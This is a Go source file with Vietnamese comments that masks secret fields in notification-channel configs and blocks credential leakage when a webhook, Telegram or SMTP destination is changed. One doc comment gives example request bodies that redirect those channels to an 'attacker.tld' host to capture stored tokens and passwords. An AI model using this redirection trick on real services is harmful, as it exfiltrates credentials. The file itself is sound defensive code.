package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix là tiền tố đánh dấu giá trị đã che. Khi API hiển thị lại thông tin xác thực thì
// dùng giá trị mang tiền tố này thay thế nội dung thật, khi API cập nhật nhận được giá trị mang
// tiền tố này thì hiểu là "giữ nguyên giá trị gốc trong kho".
//
// Dùng tiền tố thay vì chuỗi rỗng hay một hằng cố định nào đó là để tiện thể mang theo một chút
// thông tin nhận dạng (xem MaskedValue), giúp người dùng phân biệt được "đây là bot nào" mà
// không phải dán lại khóa.
const MaskedPrefix = "__masked__"

// MaskedValue sinh một giá trị đã che:
//
//	"__masked__"              giá trị gốc quá ngắn, không đưa gợi ý nào
//	"__masked__:…ab12cd"      kèm 6 ký tự cuối của giá trị gốc làm gợi ý nhận dạng
//
// Chỉ lộ 6 ký tự cuối là lựa chọn có chủ đích: thông tin nhận dạng của địa chỉ Webhook nằm ở
// đoạn cuối (như key của WeCom, id bot của Feishu), còn phần đầu thì các bot giống nhau, không
// có giá trị nhận dạng. 6 ký tự cuối không đủ để khôi phục thông tin xác thực, nhưng đủ để
// người cấu hình nhận ra "là cái nhóm của tôi".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked báo cáo một giá trị có phải giá trị đã che không (tức sau khi API hiển thị lại thì
// chưa bị sửa).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig trả về bản sao của cấu hình, thay các field thông tin xác thực của kênh đó bằng
// giá trị đã che.
//
// Loại kênh không xác định trả về map rỗng thay vì cấu hình gốc — thà để UI hiển thị "cấu hình
// không khả dụng", cũng không nhả ngược toàn bộ nội dung gốc có thể chứa thông tin xác thực khi
// không nhận diện được loại kênh. Các field không phải thông tin xác thực giữ nguyên bản, UI mới
// hiển thị bình thường.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Cấu trúc lồng nhau kiểu headers được xử lý như một thông tin xác thực nguyên khối:
		// phán định từng khóa con sẽ đòi hỏi mỗi kênh khai báo thêm một bộ quy tắc "khóa con nào
		// là thông tin xác thực", độ phức tạp vượt xa lợi ích.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials biểu thị "địa chỉ đích đã đổi, nhưng phía gọi chưa
// xác lập với các field thông tin xác thực". Trả về nó thay vì âm thầm cho qua hay âm thầm vứt
// thông tin xác thực, lý do xem PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // các khóa đích đến đã thay đổi
	Missing []string // các khóa thông tin xác thực chưa được xác lập tường minh
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "địa chỉ đích (" + strings.Join(e.Changed, ", ") + ") đã thay đổi, vui lòng đồng thời điền lại các field thông tin xác thực (" +
		strings.Join(e.Missing, ", ") + "): điền giá trị mới, hoặc tường minh để trống nếu không còn cần thông tin xác thực. " +
		"Thông tin xác thực cũ chỉ có hiệu lực với địa chỉ cũ, tiếp tục dùng lại tương đương giao nó cho địa chỉ mới."
}

// PrepareConfigUpdate gộp cấu hình kênh, đồng thời xử lý tình huống nhạy cảm về bảo mật "địa
// chỉ đích thay đổi".
//
// Nó thay thế MergeConfig trần dùng trên đường cập nhật kênh, giải quyết một đường tấn công đã
// kiểm chứng khả thi trong thực tế: địa chỉ đích (tin nhắn gửi đi đâu) và thông tin xác thực
// (gửi bằng danh tính gì) là hai bộ field độc lập, còn MergeConfig với "các khóa không được nhắc
// đến" đều giữ nguyên giá trị gốc trong kho. Thế là bất kỳ ai PATCH được kênh chỉ cần **chỉ đổi
// địa chỉ, tránh nhắc đến thông tin xác thực**, là có thể khiến server gửi thông tin xác thực
// thật trong kho đến endpoint do mình kiểm soát:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → header Authorization gốc đi ra ngoài theo yêu cầu
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<Token thật>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → sau STARTTLS giao ra username và mật khẩu
//
// Đường này hoàn toàn im lặng, không phụ thuộc chuyển hướng (nên việc từ chối nhảy qua host
// khác không chặn được nó), và đánh thủng trực tiếp mục tiêu của cơ chế che trong package này —
// "thông tin xác thực không hiển thị lại cho trình duyệt".
//
// Quy tắc: chỉ cần một khóa đích đến nào đó bị đổi thành giá trị mới, phía gọi phải xác lập
// tường minh với **từng** khóa thông tin xác thực:
//   - Đưa giá trị mới → dùng giá trị mới
//   - Tường minh truyền chuỗi rỗng → field đó không còn cần thông tin xác thực (giữ ngữ nghĩa xóa)
//   - Truyền nguyên giá trị đã che / hoặc hoàn toàn không nhắc đến khóa này → từ chối
//
// Lý do loại thứ ba cũng bị từ chối: ý nghĩa của "giá trị đã che" chính là "dùng tiếp thông tin
// xác thực cũ", mà thông tin xác thực cũ chỉ có hiệu lực với địa chỉ cũ. Chỗ này cố ý không làm
// "tự động vứt thông tin xác thực" — với các field thông tin xác thực tùy chọn (headers của
// webhook, password của email) nó sẽ âm thầm biến thành "mất xác thực nhưng API trả về 200",
// khó điều tra hơn báo lỗi. Thà để người thao tác điền thêm một lần.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("loại kênh %q chưa đăng ký", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Trong giá trị thông tin xác thực không phải chuỗi (như headers của webhook là một object)
	// nếu có nhúng literal đã che, nghĩa là phía gọi đã nhét sentinel "giữ nguyên giá trị gốc"
	// vào bên trong struct. MergeConfig chỉ nhận "chuỗi và mang tiền tố" là đã che, dạng này sẽ
	// bị lưu nguyên bản như object thường — trong kho thực sự rơi xuống literal "__masked__",
	// xác thực về sau âm thầm mất tác dụng mà không có báo lỗi nào. Thà từ chối.
	//
	// Kiểm tra này phải đặt ở **ngay đầu tiên**: khi địa chỉ không đổi sẽ đi đường return sớm,
	// đặt ở sau tương đương chỉ bao phủ đúng đường "đổi địa chỉ" (bản đầu tiên đặt sai chỗ như
	// vậy, test đã bắt được ngay).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Tìm ra các khóa đích đến thực sự bị đổi. Giá trị đã che tương đương "không đổi".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Địa chỉ không đổi, đi gộp thông thường (giá trị đã che giữ nguyên giá trị gốc, chuỗi
		// rỗng xóa, còn lại ghi đè).
		return MergeConfig(stored, incoming), nil
	}

	// Địa chỉ đã đổi: yêu cầu xác lập tường minh với từng khóa thông tin xác thực.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers từ chối việc nhét sentinel đã che vào trong cấu trúc không phải chuỗi
// khi gửi lên.
//
// Tiền đề của cơ chế che là "toàn bộ giá trị chính là một chuỗi". Field dạng object như headers
// của webhook chỉ có thể che nguyên khối (viết thành chuỗi "__masked__") hoặc gửi nguyên khối;
// nhét sentinel vào bên trong object vừa không biểu đạt được "giữ nguyên không đổi", vừa bị coi
// là giá trị thật lưu vào kho.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("nội dung của field %s chứa dấu hiệu đã che %q: field này chỉ có thể để trống nguyên khối để giữ nguyên, hoặc gửi giá trị mới nguyên khối, không được nhét placeholder đã che vào bên trong struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue so sánh hai giá trị cấu hình có tương đương không. So sánh bằng tuần tự hóa
// JSON là để tiện thể xử lý chênh lệch kiểu — cổng do frontend gửi lên là number, còn đọc lại
// từ kho là float64, so == trực tiếp sẽ phán sai.
//
// "Rỗng" phải quy nhất hóa trước rồi mới so sánh: chuỗi rỗng và "khóa không tồn tại" trong mô
// hình cấu hình này là cùng một trạng thái, vì MergeConfig coi chuỗi rỗng là xóa tường minh,
// delete luôn khóa đó. Không quy nhất hóa thì một field đích đến tùy chọn luôn để trống
// (base_url của Telegram là field duy nhất như vậy: để trống tức là dùng địa chỉ chính thức) sẽ
// đi thành đường này —
//
//	khi tạo mới lưu base_url:""  →  lần lưu đầu tiên bị MergeConfig xóa khóa
//	→ lần lưu thứ hai incoming là "", stored thiếu khóa, bị phán thành "địa chỉ đã đổi"
//	→ thông tin xác thực là giá trị đã che → 400 "địa chỉ đích đã thay đổi, vui lòng đồng thời điền lại field thông tin xác thực"
//
// Từ đó mỗi lần lưu đều thất bại, trừ khi người dùng dán lại Bot Token một lần, dù họ không đổi gì.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue phán định một giá trị cấu hình có phải "rỗng" không.
// Khẩu kính phải nhất quán với phán định xóa của MergeConfig (strings.TrimSpace(s) == ""),
// nếu không sẽ xuất hiện kẽ hở "MergeConfig cho rằng nên xóa, sameConfigValue cho rằng có giá trị".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig gộp incoming lên trên stored, dùng để cập nhật cấu hình kênh.
//
// Quy tắc:
//   - Khóa trong incoming có giá trị đã che → giữ nguyên giá trị gốc của stored (người dùng
//     không sửa field này)
//   - Khóa trong incoming có giá trị chuỗi rỗng → coi là xóa tường minh, xóa khóa đó
//   - Các khóa còn lại → ghi đè bằng giá trị của incoming
//   - Khóa có trong stored mà incoming không có → giữ lại (ngữ nghĩa cập nhật từng phần)
//
// Chuỗi rỗng có tính là "xóa" hay không cần nói rõ: form frontend gửi field chưa điền thành
// chuỗi rỗng, nếu coi nó là giá trị hợp lệ mà ghi vào, sẽ xóa thật những field "để trống để giữ
// nguyên giá trị gốc". Chỗ này chọn xóa tường minh, vì khi cần xóa một field đang cấu hình sai,
// người dùng không có cách biểu đạt nào khác (kéo field đi có thể phân biệt "chưa cung cấp" và
// "cung cấp giá trị rỗng", nhưng UI không dùng đến sự khác biệt này).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // giá trị đã che = chưa sửa, giữ nguyên stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
